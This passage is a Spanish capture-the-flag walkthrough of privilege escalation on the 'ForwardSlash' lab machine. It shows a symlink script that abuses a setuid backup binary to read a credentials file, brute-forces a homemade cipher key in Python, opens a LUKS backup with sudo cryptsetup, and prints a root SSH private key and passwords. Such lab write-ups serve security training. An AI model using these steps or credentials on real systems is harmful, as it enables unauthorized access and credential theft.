/usr/bin/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU
/Linux 3.2.0, BuildID[sha1]=e0fcfb1c48fe0b5377774c1d237dc50ddfa41c08, not stripped                                               
chiv@forwardslash:/$ strings /usr/bin/backup
/lib64/ld-linux-x86-64.so.2                                     
SwwL                                                            
libcrypto.so.1.1                                                                                                                 
_ITM_deregisterTMCloneTable                                                                                                      
__gmon_start__                                                                                                                   
_ITM_registerTMCloneTable                                                                                                        
MD5_Final                                                                                                                        
MD5_Init                                                                                                                         
MD5_Update                                                                                                                       
libc.so.6                                                                                                                        
setuid                                                                                                                           
sprintf                                                                                                                          
fopen                                                                                                                            
puts                                                            
__stack_chk_fail                                                                                                                 
putchar                                                                                                                          
fgetc                                                                                                                            
strlen                          
fclose                          
malloc                                                          
remove                          
getgid                                                          
getuid                          
localtime                     
__cxa_finalize                  
access                          
setgid            
__libc_start_main               
snprintf                 
OPENSSL_1_1_0     
GLIBC_2.4               
GLIBC_2.2.5                     
dH34%(                                                          
AWAVI                                                           
AUATL                                                                                                                            
[]A\A]A^A_
----------------------------------------------------------------------                                                           
       Pain's Next-Gen Time Based Backup Viewer                                                                                  
       v0.1                                                                                                                      
       NOTE: not reading the right file yet,                                                                                     
       only works if backup is taken in same second                                                                              
----------------------------------------------------------------------                                                           
%02x                                                                                                                             
%02d:%02d:%02d                                                                                                                   
Current Time: %s                                                                                                                 
File cannot be opened.
ERROR: %s Does Not Exist or Is Not Accessible By Me, Exiting...
;*3$"
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__init_array_end
__init_array_start
_DYNAMIC
getgid@@GLIBC_2.2.5
__libc_csu_fini
snprintf@@GLIBC_2.2.5
__gmon_start__
puts@@GLIBC_2.2.5
banner
putchar@@GLIBC_2.2.5
malloc@@GLIBC_2.2.5
fopen@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
setuid@@GLIBC_2.2.5
_IO_stdin_used
strlen@@GLIBC_2.2.5
_ITM_registerTMCloneTable
__data_start
MD5_Final@@OPENSSL_1_1_0
MD5_Update@@OPENSSL_1_1_0
__cxa_finalize@@GLIBC_2.2.5
sprintf@@GLIBC_2.2.5
fgetc@@GLIBC_2.2.5
__TMC_END__
str2md5
__dso_handle
__libc_csu_init
__bss_start
__stack_chk_fail@@GLIBC_2.4
MD5_Init@@OPENSSL_1_1_0
getuid@@GLIBC_2.2.5
fclose@@GLIBC_2.2.5
remove@@GLIBC_2.2.5
access@@GLIBC_2.2.5
_edata
localtime@@GLIBC_2.2.5
setgid@@GLIBC_2.2.5
main
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
chiv@forwardslash:/$
```

Vamos a ejecutarlo a ver que pasa:

```bash
chiv@forwardslash:/$ ./usr/bin/backup
----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:21:51
ERROR: ffd55d85b11899cdf4ebc2a452464aeb Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:/$
```

Vemos que tratar de leer un archivo cuyo nombre es un hash; si lo ejecutamos varias veces rápido, vemos que el hash es el mismo para la misma hora y luego cambia para otra hora:

```bash
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:31:28
ERROR: ef8ad1cd8f4a916d511d3727fe81170d Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:31:29
ERROR: 0cf8ab1e44af6ff87c6aeb7b84a52d4e Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:31:29
ERROR: 0cf8ab1e44af6ff87c6aeb7b84a52d4e Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:31:29
ERROR: 0cf8ab1e44af6ff87c6aeb7b84a52d4e Does Not Exist or Is Not Accessible By Me, Exiting...
chiv@forwardslash:~$
```

Por lo tanto, vamos a crearnos un script que nos ayude a generar un archivo cuyo nombre sea el hash del script `backup` y luego ejecutamos `backup` para ver que pasa.

```bash
chiv@forwardslash:~$ touch script.sh
chiv@forwardslash:~$ chmod +x script.sh
chiv@forwardslash:~$ nano script.sh 
chiv@forwardslash:~$ cat script.sh 
#!/bin/bash

hash=$(backup | grep "ERROR" | awk '{print $2}')
echo -e "\n[*] Nombre del archivo: $hash"
echo "Esto es una prueba" > $hash
ls -l; echo
backup
chiv@forwardslash:~$
```

Vamos a ejecutar nuestro script:

```bash
chiv@forwardslash:~$ ./script.sh 

[*] Nombre del archivo: 561644aeceda2787bb3c874d51cef017
total 8
-rw-rw-r-- 1 chiv chiv  19 Jan 23 03:36 561644aeceda2787bb3c874d51cef017
-rwxrwxr-x 1 chiv chiv 157 Jan 23 03:36 script.sh

----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:36:54
Esto es una prueba
chiv@forwardslash:~$ ls -l
total 4
-rwxrwxr-x 1 chiv chiv 157 Jan 23 03:36 script.sh
chiv@forwardslash:~$
```

Vemos que nos lee el contenido de nuestro archivo, así que podríamos tratar de encontar archivos cuyo propietario sea **pain** y ver su contenido con el binario `backup`:

```bash
chiv@forwardslash:/$ find \-type f -user pain 2>/dev/null
./var/backups/config.php.bak
./usr/bin/backup
./home/pain/.profile
./home/pain/user.txt
./home/pain/.bashrc
./home/pain/.bash_logout
./home/pain/encryptorinator/encrypter.py
./home/pain/encryptorinator/ciphertext
./home/pain/note.txt
chiv@forwardslash:/$
```

Tenemos el recurso `/var/backups/config.php.bak`, el cual por el nombre podría contener credenciales; asi que vamos a modificar un poco el script para que ahora en vez de meterle contenido, vamos a crear un link simbólico hacia `/var/backups/config.php.bak`.

```bash
#!/bin/bash

hash=$(backup | grep "ERROR" | awk '{print $2}')
echo -e "\n[*] Nombre del archivo: $hash"
ln -s /var/backups/config.php.bak $hash
ls -l; echo
backup
```

```bash
chiv@forwardslash:~$ ./script.sh 

[*] Nombre del archivo: fc0bfacd0c65bd1afa9f7f35a02a6e05
total 4
lrwxrwxrwx 1 chiv chiv  27 Jan 23 03:40 fc0bfacd0c65bd1afa9f7f35a02a6e05 -> /var/backups/config.php.bak
-rwxrwxr-x 1 chiv chiv 163 Jan 23 03:39 script.sh

----------------------------------------------------------------------
       Pain's Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:40:45
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
chiv@forwardslash:~$
```

Contamos con credenciales del usuario **pain** y al parecer de la base de datos; podríamos tratar de loguearnos a la base de datos:

```bash
chiv@forwardslash:~$ mysql -upain -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'pain'@'localhost' (using password: YES)
```

Vemos que no podemos. Otra cosa que podriamos tratar es migrar a dicho usuario:

```bash
chiv@forwardslash:~$ su pain
Password: 
pain@forwardslash:/home/chiv$ whoami
pain
pain@forwardslash:/home/chiv$
```

Ya somos el usuario **pain** y ahora si podemos visualizar la flag (user.txt). Ahora necesitamos migrar al usuario **root**; por lo que vamos a enumerar un poco el sistema.

```bash
pain@forwardslash:~$ id
uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
pain@forwardslash:~$
```

Vemos que podemos ejecutar algunas utilidades como el usuario **root**; además vemos un recurso en nuestro directorio de trabajo llamado **encryptorinator**. Con `cryuptsetup` podemos cifrar el disco de nuestro equipo, por lo que ya debemos estar pensando que necesitamos una contraseña la cual podríamos obtenerla a partir de los archivos en el directorio de trabajo del usuario **pain**.

```bash
pain@forwardslash:~$ ls -l
total 12
drwxr-xr-x 2 pain root 4096 Apr  8  2021 encryptorinator
-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt
-rw------- 1 pain pain   33 Jan 23 07:43 user.txt
pain@forwardslash:~$ cd encryptorinator/
pain@forwardslash:~/encryptorinator$ ls -l
total 8
-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py
pain@forwardslash:~/encryptorinator$
```

Vamos a echarle un ojito al script en python:

```bash
pain@forwardslash:~/encryptorinator$ cat encrypter.py 
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
pain@forwardslash:~/encryptorinator$
```

Tiene dos funciones, una para cifrar y otras para descifrar, como parámetros necesitamos una llave y el mensaje, tenemos el mensaje que es el otro archivo llamado `ciphertext`; sin embargo, no tenemos la llave. Entonces vamos a tratar de modificar el programa para tratar de encontrar la llave y poder leer el texto cifrado.

Vamos pensar que la clave podría ser una serie de un caracter repido, es decir, `aaaaaaa`, `bbbbbbb`; en caso de que no aplique, vamos a realizar todas las combinaciones posibles. 

```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)

if __name__ == '__main__':
    ciphertext = open('ciphertext','r').read().rstrip()
    for i in range(1, 165): # Longitud de la llave
        for j in range(33, 126): # Caracteres de ASCII en decimal - man ascii
            key = chr(j)*i # Convierte de decimal al caracter en ASCII
            msg = decrypt(key,ciphertext)
            if 'the' in msg or 'and' in msg:
                exit("Clave: {0}, Longitud de la clave: {1}, Mensaje: {2}".format(key,len(key),msg))
#print encrypt('REDACTED', 'REDACTED')
#print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

```bash
pain@forwardslash:~/encryptorinator$ python encrypter.py 
Clave: ttttttttttttttttt, Longitud de la clave: 17, Mensaje: HlvF;&you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
pain@forwardslash:~/encryptorinator$
```

Tenemos la llave que fue utilizada para cifrar el mensaje `ttttttttttttttttt`, la longitud de la llave que es 17 y el mensaje ***HlvF;&you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf*** dentro del cual vemos una contraseña, la cual posiblemente podemos utilizar con `cryptsetup`; asi que vamos para allá:

Para ejecutar `/sbin/cryptsetup luksOpen` necesitamos una ruta en la cual se encuentre un archivo asociado a la imagen de un disco, en este caso en el mensaje nos indican la ruta `/var/backups/recovery` y dentro debe existir un recurso:

```bash
pain@forwardslash:/$ ls -l /var/backups/recovery
total 976568
-rw-r----- 1 root backupoperator 1000000000 Mar 24  2020 encrypted_backup.img
pain@forwardslash:/$
```

Vemos que es un `.img`, así que vamos a ejecutarlo con `sudo` y nos pedirá una contraseña para descifrarlo y  es la que vemos en el mensaje `cB!6%sdH8Lj^@Y*$C2cf`:

```bash
pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img k4miyo
Enter passphrase for /var/backups/recovery/encrypted_backup.img: 
pain@forwardslash:/$
```

En `/dev/mapper/` debemos ver la imagen del disco que hemos creado con el nombre que eligimos:

```bash
pain@forwardslash:/$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 Jan 23 07:43 control
lrwxrwxrwx 1 root root       7 Jan 23 08:11 k4miyo -> ../dm-0
pain@forwardslash:/$
```

Ahora debemos crear una montura en el sistema del disco ya descifrado para poder acceder a su contenido; sin embargo, si vemos los comandos que podemos ejecutar como **root**, nos indica que la imagen debe llamarse **backup**, así que ejecutamos `sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup` para que se genere la imagen del disco con dicho nombre y luego creamos la montura.

```bash
pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img: 
pain@forwardslash:/$ ls -l /dev/mapper/
total 0
lrwxrwxrwx 1 root root       7 Jan 23 08:18 backup -> ../dm-1
crw------- 1 root root 10, 236 Jan 23 07:43 control
lrwxrwxrwx 1 root root       7 Jan 23 08:11 k4miyo -> ../dm-0
pain@forwardslash:/$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:/$
```

Y ahora en `/mnt/` deben estar la imagen:

```bash
pain@forwardslash:/mnt$ ls -l
total 4
-rw-r--r-- 1 root root 1675 May 27  2019 id_rsa
pain@forwardslash:/mnt$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
pain@forwardslash:/mnt$ 
```

Vemos que se trata de una `id_rsa` y lo más seguro es que sea del usuario **root**; asi que vamos a copiarla a nuestro equipo, le asignamos permiso 600 y procedemos a conectarnos como el usuario **root**. 

```bash
❯ cat id_rsa
───────┬────────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
   3   │ RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
   4   │ yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
   5   │ u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
   6   │ NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
   7   │ MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
   8   │ V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
   9   │ G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
  10   │ 3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
  11   │ vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
  12   │ MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
  13   │ Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
  14   │ 5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
  15   │ V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
  16   │ e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
  17   │ 6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
  18   │ i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
  19   │ tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
  20   │ woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
  21   │ /vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
  22   │ 1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
  23   │ J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
  24   │ OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
  25   │ ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
  26   │ ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
  27   │ -----END RSA PRIVATE KEY-----
───────┴──────────────────────────────────────────────────────────────────────
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.10.183
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 23 08:23:49 UTC 2022

  System load:  0.0               Processes:             197
  Usage of /:   53.2% of 7.75GB   Users logged in:       1
  Memory usage: 11%               IP address for ens160: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

15 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr 26 13:37:51 2021
root@forwardslash:~# whoami
root
root@forwardslash:~#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
